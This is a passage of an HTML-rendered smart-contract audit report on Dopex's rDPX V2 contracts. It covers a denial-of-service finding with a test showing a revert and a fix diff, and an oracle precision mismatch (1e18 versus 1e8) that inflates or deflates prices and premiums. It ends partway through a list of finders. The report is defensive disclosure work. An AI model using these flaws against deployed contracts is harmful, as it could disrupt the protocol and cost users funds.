class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">price</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getUnderlyingPrice</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// will revert</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">optionPricingSimple</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getOptionPrice</span><span class=\"mtk1\">(</span><span class=\"mtk12\">strike</span><span class=\"mtk1\">, </span><span class=\"mtk12\">price</span><span class=\"mtk1\">, </span><span class=\"mtk7\">100</span><span class=\"mtk1\">, </span><span class=\"mtk12\">timeToExpiry</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-5\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-5\" aria-label=\"recommended mitigation steps 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Set minimum <code>timeToExpiry</code> inside <code>calculatePremium</code> :</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"27\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  function calculatePremium(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    uint256 _strike,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    uint256 _amount,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    uint256 timeToExpiry,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    uint256 _price</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) public view returns (uint256 premium) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    premium = ((IOptionPricing(addresses.optionPricing).getOptionPrice(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      _strike,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      _price &gt; 0 ? _price : getUnderlyingPrice(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      getVolatility(_strike),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-      timeToExpiry</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      timeToExpiry &lt; 864 ? 864 : timeToExpiry</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) * _amount) / 1e8);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/756#issuecomment-1733776614\">psytama (Dopex) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Modify time to expiry with a check for less than 864 seconds and make it more robust.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/756#issuecomment-1773703004\">Alex the Entreprenerd (Judge) commented</a>:</strong></p>\n<blockquote>\n<p>The DOS is not conditional on an external requirement because it consistently happens, I’ll ask judges, but am maintaining High Severity at this time.</p>\n</blockquote>\n<hr>\n<h2 id=\"h-07-incorrect-precision-assumed-from-rdpxpriceoracle-creates-multiple-issues-related-to-value-inflationdeflation\" style=\"position:relative;\"><a href=\"#h-07-incorrect-precision-assumed-from-rdpxpriceoracle-creates-multiple-issues-related-to-value-inflationdeflation\" aria-label=\"h 07 incorrect precision assumed from rdpxpriceoracle creates multiple issues related to value inflationdeflation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/549\">[H-07] Incorrect precision assumed from RdpxPriceOracle creates multiple issues related to value inflation/deflation</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/549\">LokiThe5th</a>, also found by <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2206\">minhtrng</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2131\">QiuhaoLi</a>, Udsen (<a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2076\">1</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1619\">2</a>), 0xvj (<a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1976\">1</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1846\">2</a>), <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1911\">josephdara</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1855\">kutugu</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1684\">Evo</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1497\">0xTiwa</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1363\">crunch</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1332\">circlelooper</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1245\">0xPsuedoPandit</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1115\">Jiamin</a>, gjaldon (<a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1075\">1</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1008\">2</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/748\">3</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/397\">4</a>), <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1058\">Juntao</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/998\">umarkhatab_465</a>, hals (<a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/956\">1</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/955\">2</a>), <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/877\">eeshenggoh</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/624\">0xnev</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/525\">T1MOH</a>, and <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/411\">niki</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/amo/UniV2LiquidityAmo.sol#L372\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/amo/UniV2LiquidityAmo.sol#L372</a> </p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/amo/UniV2LiquidityAmo.sol#L381\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/amo/UniV2LiquidityAmo.sol#L381</a> </p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L539\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L539</a> </p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L1160\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L1160</a></p>\n<p>The <code>RdpxEthPriceOracle</code>, available in the audit repo <a href=\"https://github.com/dopex-io/rdpx-eth-oracle/blob/5762c2339b1c45b87ff4db172e43cef4a0ff603a/src/RdpxEthOracle.sol\">here</a>, provides the <code>RdpxV2Core</code>, the <code>UniV2LiquidityAmo</code> and the <code>PerpetualAtlanticVault</code> contracts the necessary values for <code>rdpx</code> related price calculations.</p>\n<p>The issue is that these contracts expect the returned values to be in <code>1e8</code> precision (as stated in the natspec <a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L1224\">here</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/amo/UniV2LiquidityAmo.sol#L378\">here</a> and <a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/IPerpetualAtlanticVault.sol#L20C1-L24C65\">here</a>). But the returned precision <a href=\"https://github.com/dopex-io/rdpx-eth-oracle/blob/5762c2339b1c45b87ff4db172e43cef4a0ff603a/src/RdpxEthOracle.sol#L243\">is actually <code>1e18</code></a>.</p>\n<p>This difference creates multiple issues throughout the below contracts:</p>\n<table>\n<thead>\n<tr>\n<th>Contract</th>\n<th>Function</th>\n<th>Effect</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>rdpxV2Core.sol</code></td>\n<td><code>getRdpxPrice()</code></td>\n<td>Returns an <code>1e18</code> value when <code>1e8</code> expected</td>\n</tr>\n<tr>\n<td></td>\n<td><code>calculateBondCost()</code></td>\n<td>Deflates the <code>rdpxRequired</code></td>\n</tr>\n<tr>\n<td></td>\n<td><code>calculateAmounts()</code></td>\n<td>Inflates the <code>rdpxRequiredInWeth</code></td>\n</tr>\n<tr>\n<td></td>\n<td><code>_transfer()</code></td>\n<td>Inflates <code>rdpxAmountInWeth</code> and may cause possible underflow</td>\n</tr>\n<tr>\n<td><code>UniV2LiquidityAmo</code></td>\n<td><code>getLpPriceInEth()</code></td>\n<td>Overestimates the lp value</td>\n</tr>\n<tr>\n<td><code>ReLp.sol</code></td>\n<td><code>reLP()</code></td>\n<td>Inflates min token amounts</td>\n</tr>\n<tr>\n<td><code>PerpetualAtlanticVault.sol</code></td>\n<td><code>getUnderlyingPrice()</code></td>\n<td>Returns <code>1e18</code> instead of <code>1e8</code></td>\n</tr>\n<tr>\n<td></td>\n<td><code>calculatePremium()</code></td>\n<td>Inflates the premium calculation</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"proof-of-concept-6\" style=\"position:relative;\"><a href=\"#proof-of-concept-6\" aria-label=\"proof of concept 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The <code>RdpxEthPriceOracle.sol</code> file can be found <a href=\"https://github.com/dopex-io/rdpx-eth-oracle/blob/5762c2339b1c45b87ff4db172e43cef4a0ff603a/src/RdpxEthOracle.sol\">here</a></p>\n<p>It exposes the following functions used in the audit:</p>\n<ul>\n<li><a href=\"https://github.com/dopex-io/rdpx-eth-oracle/blob/5762c2339b1c45b87ff4db172e43cef4a0ff603a/src/RdpxEthOracle.sol#L200\"><code>getLpPriceInEth()</code></a></li>\n<li><a href=\"https://github.com/dopex-io/rdpx-eth-oracle/blob/5762c2339b1c45b87ff4db172e43cef4a0ff603a/src/RdpxEthOracle.sol#L243\"><code>getRdpxPriceInEth()</code></a></li>\n</ul>\n<p>These two functions provide the current price denominated in <code>ETH</code>, with a precision in <code>1e18</code>, as confirmed by their respective natspec comments:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"28\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    /// @dev Returns the price of LP in ETH in 1e18 decimals</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function getLpPriceInEth() external view override returns (uint) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    /// @notice Returns the price of rDPX in ETH</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    /// @return price price of rDPX in ETH in 1e18 decimals</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function getRdpxPriceInEth() external view override returns (uint price) {</span></span></code></pre>\n<p>But, in the contracts from the audit repo, the business logic (and even the natspec) assumes the returned precision will be <code>1e8</code>. See below:</p>\n<p>In the <code>RdpxV2Core</code> contract the assumption that the price returned from the oracle is clearly noted in the <a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L1227C1-L1227C1\">natspec</a> of the <code>getRdpxPrice()</code> function:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"29\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">  /**</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">   * @notice Returns the price of rDPX against ETH</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">   * @dev    Price is in 1e8 Precision</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">   * @return rdpxPriceInEth rDPX price in ETH</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">   **/</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  function getRdpxPrice() public view returns (uint256) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    return</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      IRdpxEthOracle(pricingOracleAddresses.rdpxPriceOracle)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        .getRdpxPriceInEth();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span></code></pre>\n<p>In <code>UniV2LiquidityAmo</code> the assumption is noted <a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/amo/UniV2LiquidityAmo.sol#L378\">here</a>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"30\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">  /**</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">   * @notice Returns the price of a rDPX/ETH Lp token against the alpha token</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">   * @dev    Price is in 1e8 Precision</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">   * @return uint256 LP price</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">   **/</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  function getLpPrice() public view returns (uint256) {</span></span></code></pre>\n<p>And it has business logic implication here:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"31\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">  function getLpTokenBalanceInWeth() external view returns (uint256) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    return (lpTokenBalance * getLpPrice()) / 1e8;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span></code></pre>\n<p>In <code>PerpetualAtlanticVault</code> it is noted <a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/IPerpetualAtlanticVault.sol#L21\">here</a>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"32\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">  /**</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">   * @notice Returns the price of the underlying in ETH in 1e8 precision</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">   * @return uint256 the current underlying price</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">   **/</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  function getUnderlyingPrice() external view returns (uint256);</span></span></code></pre>\n<p>And the business logic implications in this contract are primarily found in the <code>calculatePremium</code> function, where the premium is divided by <code>1e8</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"33\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">  function calculatePremium(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 _strike,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 _amount,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 timeToExpiry,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 _price</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  ) public view returns (uint256 premium) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    premium = ((IOptionPricing(addresses.optionPricing).getOptionPrice(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      _strike,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      _price &gt; 0 ? _price : getUnderlyingPrice(),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      getVolatility(_strike),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      timeToExpiry</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) * _amount) / 1e8);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span></code></pre>\n<p>From the audit files it’s clear that the assumption was that the returned price would be in <code>1e8</code>, but this is Dopex’s own <code>RdpxPriceOracle</code>, so was likely a simple oversight which slipped through testing as a <code>MockRdpxEthPriceOracle</code> was implemented to simplify testing, which mocked the values from the oracle, but only to a <code>1e8</code> precision.</p>\n<h3 id=\"recommended-mitigation-steps-6\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-6\" aria-label=\"recommended mitigation steps 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>For price feeds where <code>WETH</code> will be token B, it is convention (although not a standard, as far as the reviewer is aware), that the precision returned will be <code>1e18</code>. See <a href=\"https://ethereum.stackexchange.com/questions/92508/do-all-chainlink-feeds-return-prices-with-8-decimals-of-precision\">here</a>.</p>\n<p>As the sponsor indicated that the team might move to Chainlink oracles, it is suggested to modify the <code>RdpxV2Core</code>, <code>PerpetualAtlanticVault</code>, <code>UniV2Liquidity</code> and the <code>ReLp</code> contracts to work with the returned <code>1e18</code> precision, assuming that the keep the token pair as rdpx/WETH.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/549#issuecomment-1733729931\">psytama (Dopex) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>The issue is in the oracle contract which returns 1e18.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/549#issuecomment-1759261378\">Alex the Entreprenerd (Judge) commented</a>:</strong></p>\n<blockquote>\n<p>Seems like the Warden grouped a bunch of consequences down to the root cause of the oracle precision.</p>\n<p>I’ll need to determine how to group / ungroup findings as there seem to be multple impacts but a single root cause.</p>\n</blockquote>\n<hr>\n<h2 id=\"h-08-the-peg-stability-module-can-be-compromised-by-forcing-lowerdepeg-to-revert\" style=\"position:relative;\"><a href=\"#h-08-the-peg-stability-module-can-be-compromised-by-forcing-lowerdepeg-to-revert\" aria-label=\"h 08 the peg stability module can be compromised by forcing lowerdepeg to revert permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/239\">[H-08] The peg stability module can be compromised by forcing lowerDepeg to revert</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/239\">0xrafaelnicolau</a>, also found by <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1899\">HHK</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1433\">koo</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1415\">_eperezok</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1292\">ubermensch</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1051\">nobody2018</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/978\">bart1e</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/743\">peakbolt</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/623\">0xnev</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/475\">ElCid</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/292\">HChang26</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/273\">Vagner</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/205\">max10afternoon</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/176\">volodya</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/155\">yashar</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/116\">degensec</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/82\">Krace</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2208\">minhtrng</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2186\">KrisApostolov</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2180\">dimulski</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2146\">0xc0ffEE</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2135\">pontifex</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2092\">Toshii</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1972\">0xkazim</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1954\">dethera</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1940\">0xMosh</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1938\">halden</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1917\">mussucal</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1890\">ether_sky</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1813\">wintermute</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1788\">bin2chen</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1609\">QiuhaoLi</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1557\">0xvj</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1546\">Aymen0909</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1483\">glcanvas</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1457\">RED-LOTUS-REACH</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1436\">gizzy</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1408\">MiniGlome</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1391\">Talfao</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1022\">carrotsmuggler</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/977\">ladboy233</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/962\">Baki</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/954\">hals</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/715\">chainsnake</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/714\">asui</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/707\">Viktor_Cortess</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/661\">Inspex</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/653\">qbs</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/613\">lanrebayode77</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/547\">zaevlad</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/535\">tapir</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/515\">ABAIKUNANBAEV</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/361\">dirk_y</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/345\">gumgumzum</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/315\">zzebra83</a>, ravikiranweb3 (<a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/252\">1</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/214\">2</a>), <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/235\">rvierdiiev</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/192\">Nyx</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/172\">kodyvim</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/162\">Jorgect</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/115\">Kow</a>, <a 